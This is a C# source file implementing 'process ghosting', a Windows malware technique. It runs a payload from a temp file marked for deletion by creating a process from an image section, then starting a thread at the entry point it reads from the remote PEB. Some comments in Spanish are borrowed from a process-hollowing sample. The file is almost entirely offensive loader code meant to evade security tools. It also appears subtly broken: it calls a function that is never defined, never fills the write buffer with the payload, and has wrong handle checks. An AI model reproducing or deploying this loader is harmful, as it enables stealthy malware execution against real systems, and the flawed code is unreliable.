using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using static Process_Ghosting.Program;

namespace Process_Ghosting
{
    unsafe class Program
    {
        public static void Main(string[] args)
        {
            string targetPath = "C:\\system32\\calc.exe";
            byte[] payladBuf = File.ReadAllBytes(args[0]);
            ulong payloadSize = (ulong)payladBuf.Length;
            bool is_ok = process_ghost(targetPath, payladBuf, payloadSize);
        }

        static IntPtr open_file(string filePath)
        {
            IntPtr hFile = IntPtr.Zero;
            OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
            objAttr.Length = Marshal.SizeOf(objAttr);
            objAttr.ObjectName = Native.CreateUnicodeStruct(@"\??\" + filePath);
            objAttr.Attributes = 0x40;
            IO_STATUS_BLOCK ioStatusBlock = new IO_STATUS_BLOCK();
            IntPtr stat = Native.NtOpenFile(ref hFile, 0x00010000 | 0x00100000 | 0x80000000 | 0x40000000,
                ref objAttr, ref ioStatusBlock, 0x00000001 | 0x00000002, 0x00000000 | 0x00000020);

            return stat;
        }
        static IntPtr make_section_from_delete_pending_file(string filePath, byte[] payladBuf, ulong payloadSize)
        { 
            IntPtr hDelFile = open_file(filePath);
            IO_STATUS_BLOCK status_block = new IO_STATUS_BLOCK();

            FILE_LINK_INFORMATION fileLinkInformation = new FILE_LINK_INFORMATION();
            fileLinkInformation.ReplaceIfExists = true;
            int fileLinkInformationLen = Marshal.SizeOf(fileLinkInformation);
            IntPtr pFileLinkInformation = Marshal.AllocHGlobal(fileLinkInformationLen);

            Native.NtSetInformationFile(hDelFile, ref status_block, pFileLinkInformation, 
                (UInt32)fileLinkInformationLen, 13);
            int ppayladBufLen = Marshal.SizeOf(payladBuf);
            IntPtr ppayladBuf = Marshal.AllocHGlobal(ppayladBufLen);
            Native.NtWriteFile(hDelFile, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out _, ppayladBuf, payloadSize,
					IntPtr.Zero, IntPtr.Zero);
            IntPtr hSection = IntPtr.Zero;
            int CreateSectionStatus = Native.NtCreateSection(ref hSection, 
                0x0001 | 0x0002 | 0x0004 | 0x0008 | 0x0010 | 0x000F0000, IntPtr.Zero, 
                IntPtr.Zero, 0x20, 0x01000000, hDelFile);

            Native.NtClose(hDelFile);

            return hSection;

        }
        static bool process_ghost(string targetPath, byte[] payladBuf, ulong payloadSize)
        {
            IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
            IntPtr STATUS_SUCCESS = IntPtr.Zero;
            string tempFile = Path.GetTempFileName();
            IntPtr hSection = make_section_from_delete_pending_file(tempFile, payladBuf, payloadSize);
            if (hSection == INVALID_HANDLE_VALUE)
            {
                return false;
            }
            IntPtr hProcess = IntPtr.Zero;
            IntPtr NtCurrentProcess = new IntPtr(-1);
            IntPtr status = Native.NtCreateProcessEx(ref hProcess, 0xFFFF| 0x000F0000| 0x00100000, IntPtr.Zero,
                NtCurrentProcess, 4, hSection, IntPtr.Zero, IntPtr.Zero, 0);
            if (status != STATUS_SUCCESS)
            {
                return false;
            }
            PROCESS_BASIC_INFORMATION ProcBasic = new PROCESS_BASIC_INFORMATION();
            int RetLength = Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION));
            IntPtr STATUS = Native.NtQueryInformationProcess(hProcess, 0, ref ProcBasic, RetLength, ref RetLength);

            if (STATUS != STATUS_SUCCESS)
            {
                return false;
            }

            //https://github.com/juliourena/plaintext/blob/37a034a415f91dde2884592fa72022ba6d0063bd/CSharp%20Tools/ProcessInjection/ProcessHollowingSimple.cs
            IntPtr ptrImageBase = (IntPtr)((Int64)ProcBasic.PebBaseAddress + 0x10);

            // Variables para guardar el valor de ImageBaseAddress
            // ImageBaseAddress byte
            byte[] ImageBaseAddress = new byte[8];

            // bytesRead 
            IntPtr bytesRead;

            // Leer 8 bytes de memoria en la ubicación del PEB para obtener la dirección del ImageBaseAddress (ReadProcessMemory)
            ReadProcessMemory(hProcess, ptrImageBase, ImageBaseAddress, 8, out bytesRead);

            IntPtr ProcessBaseAddr = (IntPtr)BitConverter.ToInt64(ImageBaseAddress, 0);

            Console.WriteLine(" | -> ImageBaseAddress: 0x{0:X16}", ProcessBaseAddr.ToInt64());

            // Variable para almacenar el contenido de la memoria
            byte[] dataPE = new byte[0x200];

            // Leer 512 Bytes de memoria en la ubicación del ImageBaseAddress (ReadProcessMemory)
            ReadProcessMemory(hProcess, ProcessBaseAddr, dataPE, dataPE.Length, out bytesRead);

            // Obtener el valor de e_lfanew 
            // 0x3C - Ubicación
            uint e_lfanew = BitConverter.ToUInt32(dataPE, 0x3C);

            // Obtener el valor de opthdr (optional header a partir del e_lfanew)
            // e_lfanew + 0x28
            uint opthdr = e_lfanew + 0x28;

            // Obtener el valor del entrypoint_rva
            uint entrypoint_rva = BitConverter.ToUInt32(dataPE, (int)opthdr);

            // Obtener el valor del AddressOfEntryPoint
            // entrypoint_rva + ImageBaseAddress
            IntPtr procEntry = (IntPtr)((UInt64)ProcessBaseAddr + entrypoint_rva);

            if (!setup_process_parameters(hProcess, ProcBasic, targetPath))
            {
                return false;
            }
            IntPtr hThread = IntPtr.Zero;
            status = (IntPtr)Native.NtCreateThreadEx(ref hThread,
                0x000F0000| 0x00100000| 0xFFFF,
                IntPtr.Zero,
                hProcess,
                (IntPtr)procEntry,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero
            );

            if (status != STATUS_SUCCESS)
            {
                return false;
            }
            return true;
        }
        static bool buffer_remote_peb(IntPtr hProcess, PROCESS_BASIC_INFORMATION pi, out PEB peb_copy)
        {
            PEB PebBlock = new PEB();
            IntPtr peb = Marshal.AllocHGlobal(Marshal.SizeOf(PebBlock));
            peb_copy = (PEB)Marshal.PtrToStructure(peb, typeof(PEB));
            IntPtr remote_peb_addr = pi.PebBaseAddress;
            // Write the payload's ImageBase into remote process' PEB:
            bool status = Native.NtReadVirtualMemory(hProcess, remote_peb_addr, peb, sizeof(PEB), out _);
            if (!status)
            {
                return false;
            }
            return true;
        }
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead);
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct PEB
        {
            public byte inheritedAddressSpace;
            public byte readImageFileExecutionOptions;
            public byte isBeingDebugged;
            public byte reserved;
            public IntPtr mutant;
            public IntPtr ImageBaseAddress;
            public IntPtr loaderData;
            public IntPtr processParameters;

            public bool IsBeingDebugged { get { return !(isBeingDebugged == 0); } }
            public IntPtr ProcessParameters { get { return processParameters; } }
        };

        // Win32 PEB structure.  Represents the process environment block of a process.
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct PebWow64
        {
            public byte inheritedAddressSpace;
            public byte readImageFileExecutionOptions;
            public byte isBeingDebugged;
            public byte reserved;
            public uint padding;
            public ulong mutant;
            public ulong imageBaseAddress;
            public ulong loaderData;
            public ulong processParameters;

            public bool IsBeingDebugged { get { return !(isBeingDebugged == 0); } }
            public ulong ProcessParameters { get { return processParameters; } }
        };
        [DllImport("KernelBase.dll")]
        public static extern IntPtr CreateFileW(
            string lpFileName,
            UInt32 dwDesiredAccess,
            UInt32 dwShareMode,
            IntPtr lpSecurityAttributes,
            UInt32 dwCreationDisposition,
            UInt32 dwFlagsAndAttributes,
            IntPtr hTemplateFile);
        [DllImport("Kernel32.dll", EntryPoint = "CreateFileMapping", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr CreateFileMapping(
            IntPtr hFile, 
            IntPtr lpAttributes, 
            uint flProtect, 
            uint dwMaximumSizeHigh, 
            uint dwMaximumSizeLow, 
            string lpName);

        [DllImport("Kernel32.dll")]
        private static extern IntPtr MapViewOfFile(
            IntPtr hFileMappingObject, 
            uint dwDesiredAccess,
            uint dwFileOffsetHigh,
            uint dwFileOffsetLow,
            uint dwNumberOfBytesToMap);

        [DllImport("Kernel32.dll", EntryPoint = "UnmapViewOfFile", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool UnmapViewOfFile(IntPtr lpBaseAddress);
        [DllImport("Kernel32")]
        public extern static bool CloseHandle(IntPtr handle);
        [DllImport("kernel32.DLL", SetLastError = true)]
        private static extern UIntPtr GetFileSize(
            IntPtr fileHandle,
            IntPtr fileSizeHigh);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UIntPtr size, UInt32 flAllocationType, UInt32 flProtect);
        
        IntPtr buffer_payload(string filename, UIntPtr r_size) 
        {
            IntPtr file = CreateFileW(filename, 0x00000001| 0x80000000, 0x00000001, IntPtr.Zero, 3, 0x00000080, IntPtr.Zero);
            if (file == new IntPtr(-1))
            {
                return IntPtr.Zero;
            }
            IntPtr mapping = CreateFileMapping(file, IntPtr.Zero, 0x02, 0, 0, null);
            if (mapping!= IntPtr.Zero)
            {
                Native.CloseHandle(file);
                return IntPtr.Zero;
            }
            IntPtr dllRawData = MapViewOfFile(mapping, 0x0004, 0, 0, 0);
            if (dllRawData == null)
            {
                CloseHandle(mapping);
                CloseHandle(file);
                return IntPtr.Zero;
            }
            r_size = GetFileSize(file, IntPtr.Zero);
            IntPtr localCopyAddress = (IntPtr)VirtualAlloc(0, r_size, 0x00001000 | 0x00002000, 0x04);
            if (localCopyAddress == null)
            {
                return IntPtr.Zero;
            }
            byte[] bytes = BitConverter.GetBytes((int)dllRawData);
            Marshal.Copy(bytes, 0, localCopyAddress, (int)r_size);
            UnmapViewOfFile(dllRawData);
            CloseHandle(mapping);
            CloseHandle(file);
            return localCopyAddress;
        }
        void free_buffer(IntPtr buffer, UIntPtr buffer_size)
        {
            if (buffer == null) return;
            VirtualFree(buffer, buffer_size, 0x4000);
        }
    }
}
